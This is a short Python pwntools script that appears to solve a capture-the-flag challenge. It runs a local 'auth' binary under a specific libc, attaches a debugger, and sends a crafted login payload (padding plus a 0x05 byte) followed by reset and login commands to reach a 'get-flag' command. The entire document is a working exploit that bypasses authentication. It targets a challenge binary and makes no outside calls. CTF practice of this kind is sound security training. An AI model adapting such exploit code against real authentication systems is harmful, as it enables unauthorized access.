import pwn as p

target = p.process('./auth', env={'LD_PRELOAD': './libc-2.23.so'})
# target = p.process('./auth')
p.gdb.attach(target)

# methods to stop making pwn whine about bytes


def b(s: str) -> bytes:
    return s.encode('utf8')


def s(b: bytes) -> str:
    return b.decode('utf8')


target.sendline(b'login '+b'0'*8+b'\x05')
target.sendline(b'reset')
target.sendline(b'login hello')
target.sendline(b'get-flag')


target.interactive()


